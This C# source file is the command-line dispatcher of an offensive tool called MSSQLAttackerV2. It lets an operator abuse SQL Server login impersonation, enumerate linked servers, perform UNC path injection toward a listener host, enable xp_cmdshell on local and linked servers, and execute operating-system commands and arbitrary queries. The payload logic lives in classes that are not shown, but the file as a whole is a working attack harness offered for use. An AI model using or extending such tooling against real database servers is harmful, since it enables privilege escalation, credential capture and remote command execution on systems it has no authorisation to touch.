using System;
using MSSQLAttackerV2.Banner;
using System.Data.SqlClient;


namespace MSSQLAttackerV2.Modules
{
    internal class AttackCLI
    {
        
        public void attack(string[] args)
        {
            String dbserver, lhost, attack;
            String linkedServer = "";
            String command = "";
            String dbname = "";
            String dboname = "";
            String customQuery = "";
            SqlConnection con;
            var help = new Help();
            var runQuery = new RunQuery();
            var connection = new Connection();
            var ArgumentChecker = new ArgumentChecker();
            if (args.Length < 2) { help.printCliHelp(); return; }
            string[] attacks = { "checkimpersonate", "checklinkedservers", "checklinkedserverVersion", "uncpathinject", "getinfo", "enablecmdshell", "enablelinkedcmdshell", "execlinkedcmd", "execcmd", "runCustomQuery" };
            if (!ArgumentChecker.checkArgs(args, "-a")) { help.printAttacks(attacks); return; }
            if (ArgumentChecker.checkArgs(args, "-d")) { dbname = args[Array.IndexOf(args, "-d") + 1]; }
            attack = args[Array.IndexOf(args, "-a") + 1];
            if (!ArgumentChecker.checkSubargs(args, attack)) { return; }

            dbserver = args[Array.IndexOf(args, "-t") + 1];

            linkedServer = args[Array.IndexOf(args, "-ls") + 1];
            command = args[Array.IndexOf(args, "-c") + 1];
            customQuery = args[Array.IndexOf(args, "-query") + 1];
            //Console.WriteLine(customQuery);

            if (ArgumentChecker.checkArgs(args, "-dbo")) { dboname = args[Array.IndexOf(args, "-dbo") + 1]; }
            lhost = args[Array.IndexOf(args, "-l") + 1];
            // Try connecting to the specified server
            try
            {
                if (ArgumentChecker.checkArgs(args, "-u") && ArgumentChecker.checkArgs(args, "-p"))
                {
                    String username = args[Array.IndexOf(args, "-u") + 1];
                    String password = args[Array.IndexOf(args, "-p") + 1];
                    con = connection.connectDb(dbserver, dbname, username, password);
                }
                if (ArgumentChecker.checkArgs(args, "-d"))
                {

                    con = connection.connectDb(dbserver, dbname);
                }
                else { con = connection.connectDb(dbserver); }
            }
            catch (Exception) { return; }
            if (con == null) { return; }
            //Impersonation
            var impersonate = new Impersonate();
            var LinkedServer = new LinkedServer();
            var CommanAttacks = new CommonAttacks();
            if (Array.Exists(args, element => element == "-impersonateSA")) { impersonate.abuseImpersonation(con); }
            if (Array.Exists(args, element => element == "-impersonateDBO")) { if (ArgumentChecker.checkArgs(args, "-dbo")) { impersonate.abuseImpersonationDBO(con, dboname); } else { impersonate.abuseImpersonationDBO(con); } }
            

            //Main Attack
            switch (attack.ToLower())
            {

                case "getinfo":
                    var getInfo = new GetInfo();
                    getInfo.loginInfo(con);
                    break;

                case "checkimpersonate":
                    impersonate.checkImpersonation(con);
                    break;
                case "checklinkedservers":
                    LinkedServer.enumLinkedServer(con);
                    break;
                case "checklinkedserverversion":
                    LinkedServer.enumLinkedServerVersion(con, linkedServer);
                    break;
                case "uncpathinject":
                    CommanAttacks.uncPathInjection(con, lhost);
                    break;
                case "enablecmdshell":
                    CommanAttacks.enableXpCmdShell(con);
                    break;
                case "enablelinkedcmdshell":
                    LinkedServer.enableLinkedCmdShell(con, linkedServer);
                    break;
                case "execcmd":

                    CommanAttacks.execCMD(con, command);
                    break;

                case "execlinkedcmd":
                    LinkedServer.linkedServerCmdExec(con, linkedServer, command);
                    break;
                case "runcustomquery":
                    runQuery.customQuery(con, customQuery);
                    break;
                default:
                    var helpwrite = new Helpwrite();
                    var Help = new Help();
                    helpwrite.doWrite(0, "Wrong Attack?");
                    Help.printCliHelp();
                    break;
            }

            con.Close();
        }
    }
}
